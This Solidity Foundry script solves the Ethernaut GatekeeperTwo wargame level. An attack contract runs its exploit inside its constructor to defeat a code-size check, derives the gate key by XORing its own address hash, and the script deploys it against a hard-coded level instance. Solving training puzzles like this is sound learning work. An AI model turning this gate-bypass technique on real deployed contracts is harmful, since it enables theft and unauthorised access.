// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../../src/Ethernaut/gatekeepertwo.sol";

contract GatekeeperTwoAttack {
    constructor(address _gatekeeper) {
        GatekeeperTwo gatekeeper = GatekeeperTwo(_gatekeeper);

        // Calculate the gate key
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                type(uint64).max
        );

        gatekeeper.enter(gateKey);
    }
}

contract GatekeepTwoScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new GatekeeperTwoAttack(0x93D27f8BDa55B5758de764B8db6004c958caDfc4);
        vm.stopBroadcast();
    }
}
